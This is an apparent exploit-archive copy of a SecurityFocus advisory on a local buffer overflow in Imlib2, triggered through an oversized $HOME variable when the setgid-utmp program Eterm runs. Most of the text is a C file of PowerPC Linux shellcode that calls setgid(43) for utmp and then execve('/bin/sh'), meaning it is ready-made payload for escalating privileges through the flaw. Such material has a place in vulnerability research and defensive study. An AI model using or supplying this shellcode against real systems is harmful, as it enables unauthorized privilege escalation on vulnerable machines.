source: http://www.securityfocus.com/bid/3868/info

Imlib2 is a freely available, open source graphics library available for the Linux and Unix operating systems. It is maintained by Michael Jennings.

Imlib2 is installed on many operating systems and linked with graphical programs such as Eterm. Some programs linked with the library are setuid, such as Eterm which is a setuid utmp program. In some cases, a buffer overflow in the $HOME environment variable may occurs, such as when the $HOME environment variable is filled with 4128 bytes and Eterm is executed. This can allow a local user to overwrite stack variables up through the return address, and execute arbitrary code. As the Eterm program is setgid utmp, this code would be executed with utmp privileges. 

/* execve.c
 *
 * PowerPC Linux Shellcode
 *
 * by Charles Stevenson <core@bokeoa.com>
 *
 * original execve by my good friend
 * Kevin Finisterre  <dotslash@snosoft.com>
 */

#include <stdio.h>

char shellcode[] =
/* setgid(43) utmp */
        "\x38\x60\x01\x37"              /* 100004a0: li
r3,311             */
        "\x38\x63\xfe\xf4"              /* 100004a4: addi
r3,r3,-268         */
        "\x3b\xc0\x01\x70"              /* 100004a8: li
r30,368            */
        "\x7f\xc0\x1e\x70"              /* 100004ac: srawi
r0,r30,3           */
        "\x44\xff\xff\x02"              /* 100004b0:
sc                         */
/* execve("/bin/sh") */
        "\x7c\xa5\x2a\x78"              /* 100004b0: xor
r5,r5,r5        */
        "\x40\x82\xff\xed"              /* 100004b4: bnel+      100004a0
<main> */
        "\x7f\xe8\x02\xa6"              /* 100004b8: mflr
r31             */
        "\x3b\xff\x01\x30"              /* 100004bc: addi
r31,r31,304     */
        "\x38\x7f\xfe\xf4"              /* 100004c0: addi
r3,r31,-268     */
        "\x90\x61\xff\xf8"              /* 100004c4: stw
r3,-8(r1)       */
        "\x90\xa1\xff\xfc"              /* 100004c8: stw
r5,-4(r1)       */
        "\x38\x81\xff\xf8"              /* 100004cc: addi
r4,r1,-8        */
        "\x3b\xc0\x01\x60"              /* 100004d0: li
r30,352         */
        "\x7f\xc0\x2e\x70"              /* 100004d4: srawi
r0,r30,5        */
        "\x44\xff\xff\x02"              /* 100004d8:
sc                         */
        "\x2f\x62\x69\x6e"              /* 100004dc: cmpdi
cr6,r2,26990    */
        "\x2f\x73\x68\x00";             /* 100004e0: cmpdi
cr6,r19,26624   */

int main(int argc, char **argv) {
   fprintf(stderr,"sizeof(shellcode)=%d\n",sizeof(shellcode));
   //__asm__("b shellcode");
   printf("%s",shellcode);
   return 0;
}
